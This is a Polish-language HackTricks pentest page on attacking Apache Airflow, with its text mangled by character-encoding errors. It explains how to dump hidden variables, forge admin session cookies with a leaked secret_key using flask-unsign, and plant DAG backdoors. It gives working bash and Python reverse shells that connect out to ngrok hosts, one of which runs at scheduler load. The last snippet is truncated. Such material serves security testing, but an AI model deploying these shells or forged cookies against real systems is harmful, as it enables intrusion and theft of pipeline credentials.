# BezpieczeÅ„stwo Apache Airflow

<details>

<summary><strong>Zacznij od zera i staÅ„ siÄ™ ekspertem od hakowania AWS dziÄ™ki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[**Apache Airflow**](https://airflow.apache.org) sÅ‚uÅ¼y jako platforma do **orkiestracji i harmonogramowania potokÃ³w danych lub prac**. Termin "orkiestracja" w kontekÅ›cie potokÃ³w danych oznacza proces organizowania, koordynowania i zarzÄ…dzania zÅ‚oÅ¼onymi potokami danych pochodzÄ…cymi z rÃ³Å¼nych ÅºrÃ³deÅ‚. GÅ‚Ã³wnym celem tych zorchestrowanych potokÃ³w danych jest dostarczanie przetworzonych i konsumowalnych zbiorÃ³w danych. Te zbiory danych sÄ… szeroko wykorzystywane przez szereg aplikacji, w tym miÄ™dzy innymi narzÄ™dzia do inteligencji biznesowej, modele nauki danych i uczenia maszynowego, ktÃ³re sÄ… podstawÄ… dziaÅ‚ania aplikacji big data.

W skrÃ³cie, Apache Airflow pozwoli Ci **harmonogramowaÄ‡ wykonanie kodu, gdy coÅ›** (zdarzenie, cron) **siÄ™ dzieje**.

## Lokalne laboratorium

### Docker-Compose

MoÅ¼esz uÅ¼yÄ‡ **pliku konfiguracyjnego docker-compose z** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) aby uruchomiÄ‡ kompletnÄ… Å›rodowisko dockerowe Apache Airflow. (JeÅ›li korzystasz z systemu MacOS, upewnij siÄ™, Å¼e przypisujesz co najmniej 6 GB pamiÄ™ci RAM do maszyny wirtualnej docker).

### Minikube

Jednym prostym sposobem **uruchomienia Apache Airflow** jest uruchomienie go **z minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Konfiguracja Airflow

Airflow moÅ¼e przechowywaÄ‡ **informacje poufne** w swojej konfiguracji lub moÅ¼na znaleÅºÄ‡ sÅ‚abe konfiguracje:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC Airflow

Zanim zaczniesz atakowaÄ‡ Airflow, powinieneÅ› zrozumieÄ‡ **jak dziaÅ‚ajÄ… uprawnienia**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Ataki

### Wyliczanie Konsoli Sieciowej

JeÅ›li masz **dostÄ™p do konsoli sieciowej**, moÅ¼esz mieÄ‡ dostÄ™p do niektÃ³rych lub wszystkich nastÄ™pujÄ…cych informacji:

* **Zmienne** (Tutaj mogÄ… byÄ‡ przechowywane niestandardowe informacje poufne)
* **PoÅ‚Ä…czenia** (Tutaj mogÄ… byÄ‡ przechowywane niestandardowe informacje poufne)
* DostÄ™p do nich pod adresem `http://<airflow>/connection/list/`
* [**Konfiguracja**](./#airflow-configuration) (Informacje poufne, takie jak **`secret_key`** i hasÅ‚a, mogÄ… byÄ‡ przechowywane tutaj)
* Lista **uÅ¼ytkownikÃ³w i rÃ³l**
* **Kod kaÅ¼dego DAG** (ktÃ³ry moÅ¼e zawieraÄ‡ interesujÄ…ce informacje)

### Pobieranie WartoÅ›ci Zmiennych

Zmienne mogÄ… byÄ‡ przechowywane w Airflow, aby **DAGi** mogÅ‚y **uzyskaÄ‡ dostÄ™p** do ich wartoÅ›ci. Jest to podobne do tajemnic innych platform. JeÅ›li masz **wystarczajÄ…ce uprawnienia**, moÅ¼esz uzyskaÄ‡ do nich dostÄ™p w interfejsie graficznym pod adresem `http://<airflow>/variable/list/`.\
DomyÅ›lnie Airflow pokaÅ¼e wartoÅ›Ä‡ zmiennej w interfejsie graficznym, jednak, zgodnie z [**tym**](https://marclamberti.com/blog/variables-with-apache-airflow/), moÅ¼na ustawiÄ‡ **listÄ™ zmiennych**, ktÃ³rych **wartoÅ›Ä‡** bÄ™dzie wyÅ›wietlana jako **gwiazdki** w **GUI**.

![](<../../.gitbook/assets/image (164).png>)

Jednak te **wartoÅ›ci** mogÄ… byÄ‡ nadal **pobrane** za pomocÄ… **CLI** (musisz mieÄ‡ dostÄ™p do bazy danych), wykonania **arbitralnego DAGa**, dostÄ™pu do **API** poprzez dostÄ™p do punktu koÅ„cowego zmiennych (API musi byÄ‡ aktywowane), a nawet **samemu GUI!**\
Aby uzyskaÄ‡ dostÄ™p do tych wartoÅ›ci z GUI, po prostu **wybierz zmienne**, do ktÃ³rych chcesz uzyskaÄ‡ dostÄ™p, i **kliknij Akcje -> Eksport**.\
Innym sposobem jest wykonanie **bruteforce** do **ukrytej wartoÅ›ci**, korzystajÄ…c z **filtracji wyszukiwania**, aÅ¼ jÄ… znajdziesz:

![](<../../.gitbook/assets/image (152).png>)

### Eskalacja UprawnieÅ„

JeÅ›li konfiguracja **`expose_config`** jest ustawiona na **True**, od roli **UÅ¼ytkownik** i **wyÅ¼ej** mogÄ… **odczytaÄ‡** **konfiguracjÄ™ w sieci**. W tej konfiguracji pojawia siÄ™ **`secret_key`**, co oznacza, Å¼e kaÅ¼dy uÅ¼ytkownik z tÄ… waÅ¼nÄ… wartoÅ›ciÄ… moÅ¼e **utworzyÄ‡ wÅ‚asne podpisane ciasteczko, aby podszyÄ‡ siÄ™ pod dowolne inne konto uÅ¼ytkownika**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Tylnie drzwi DAG (RCE w Airflow worker)

JeÅ›li masz **dostÄ™p do zapisu** w miejscu, gdzie **sÄ… zapisywane DAGi**, moÅ¼esz **po prostu utworzyÄ‡** taki, ktÃ³ry wyÅ›le do Ciebie **odwrotnÄ… powÅ‚okÄ™.**\
ZauwaÅ¼, Å¼e ta odwrotna powÅ‚oka zostanie wykonana wewnÄ…trz kontenera **airflow worker**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Tylnie drzwi DAG (RCE w harmonogramie Airflow)

JeÅ›li ustawisz coÅ› do **wykonania w gÅ‚Ã³wnym katalogu kodu**, w chwili pisania tego tekstu, zostanie to **wykonane przez harmonogram** po kilku sekundach od umieszczenia go wewnÄ…trz folderu DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Tworzenie DAG

JeÅ›li uda ci siÄ™ **skompromitowaÄ‡ maszynÄ™ w klastrze DAG**, moÅ¼esz tworzyÄ‡ nowe **skrypty DAG** w folderze `dags/`, a nastÄ™pnie zostanÄ… one **skopiowane na pozostaÅ‚e maszyny** w klastrze DAG.

### Wstrzykiwanie Kodu DAG

Podczas wykonywania DAG z interfejsu graficznego, moÅ¼esz **przekazywaÄ‡ do niego argumenty**.\
Dlatego, jeÅ›li DAG nie jest poprawnie napisany, moÅ¼e byÄ‡ **podatny na Wstrzykiwanie PoleceÅ„.**\
Tak wÅ‚aÅ›nie staÅ‚o siÄ™ w przypadku tego CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Wszystko, co musisz wiedzieÄ‡, aby **rozpoczÄ…Ä‡ poszukiwania wstrzykiwania poleceÅ„ w DAG**, to to, Å¼e **parametry** sÄ… **odczytywane** za pomocÄ… kodu **`dag_run.conf.get("nazwa_parametru")`**.

Co wiÄ™cej, ta sama podatnoÅ›Ä‡ moÅ¼e wystÄ…piÄ‡ w przypadku **zmiennych** (zauwaÅ¼, Å¼e posiadajÄ…c wystarczajÄ…ce uprawnienia, moÅ¼esz **kontrolowaÄ‡ wartoÅ›Ä‡ zmiennych** w interfejsie graficznym). Zmienne sÄ… **odczytywane za pomocÄ…**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
JeÅ›li sÄ… uÅ¼ywane na przykÅ‚ad w poleceniu bash, moÅ¼na przeprowadziÄ‡ wstrzykniÄ™cie poleceÅ„.

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
